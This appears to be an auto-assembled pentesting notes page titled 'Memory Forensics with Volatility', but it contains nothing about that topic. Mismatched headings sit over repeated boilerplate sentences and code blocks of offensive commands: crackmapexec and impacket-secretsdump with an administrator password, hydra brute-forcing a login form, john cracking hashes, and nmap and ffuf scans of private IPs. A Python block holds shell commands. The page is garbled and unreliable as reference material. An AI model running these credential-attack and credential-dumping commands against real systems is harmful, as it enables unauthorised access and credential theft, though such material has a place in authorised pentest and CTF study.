---
TitleSEO: "Memory Forensics with Volatility | ZureFX"
TitlePost: "Memory Forensics with Volatility"
Author: "ZureFX"
Description: "Personal notes on Memory Forensics with Volatility. Quick reference for pentesting and CTF challenges."
Keywords: "windows, cheatsheet, linux, persistence, lateral movement"
URL: "https://zurefx.github.io/notes/note-memory-forensics-with-volatility-350.html"
URL_IMAGES: ""
Date: "2024-12-21"
Tags: "Windows, Cheatsheet, Linux, Persistence, Lateral Movement"
Section: "notes"
Lang: "en"
main_img: "note-memory-forensics-with-volatility-350"
Permalink: "/notes/note-memory-forensics-with-volatility-350.html"
BtnLabel: "Read Notes"
Pick: 0
---
## MSSQL

### Golden Ticket

Initial enumeration revealed several interesting open ports on the target. Privilege escalation was possible due to misconfigured sudo permissions. The service was running without proper input validation, leading to injection vulnerabilities. The application stored sensitive credentials in an unencrypted configuration file. Lateral movement was facilitated by reusing discovered credentials across services.

> **Note:** DCSync was identified as the primary attack vector in this scenario.

Privilege escalation was possible due to misconfigured sudo permissions. The scheduled task ran with elevated privileges and could be abused for escalation. Weak file permissions allowed modification of critical system files. Command injection was possible through unsanitized user input in the search functionality.

- `mimikatz`
- `lookupsid`
- `sharphound`

```bash
crackmapexec smb 10.76.170.208 -u administrator -p 'P@ssw0rd!' --shares
crackmapexec smb 10.69.8.77 -u administrator -p 'P@ssw0rd!' --shares
```

## wpscan

### DNS

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.73.36.57 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
impacket-secretsdump administrator:'P@ssw0rd!'@10.48.68.214
```

- `nikto`
- `Pass the Hash`
- `Command Injection`
- `Remote Code Execution`

The scheduled task ran with elevated privileges and could be abused for escalation. Group Policy Preferences contained encrypted but recoverable credentials. Group Policy Preferences contained encrypted but recoverable credentials.

```python
crackmapexec smb 10.49.230.194 -u administrator -p 'P@ssw0rd!' --shares
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.112.22.61/FUZZ
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.33.29.241 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

## SQL Injection

### POP3

```bash
nmap -sCV -p3268,22,1521 10.53.110.4 -oN scan.txt
```

Command injection was possible through unsanitized user input in the search functionality. The backup files contained sensitive information that should not have been accessible. Weak file permissions allowed modification of critical system files. The scheduled task ran with elevated privileges and could be abused for escalation. Post-exploitation enumeration revealed a path to domain administrator privileges.

```bash
nmap -sCV -p25,53,53 10.97.141.202 -oN scan.txt
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.40.225.72/FUZZ
nmap -sCV -p5432,5985,143 10.105.24.2 -oN scan.txt
impacket-secretsdump administrator:'P@ssw0rd!'@10.45.220.106
```
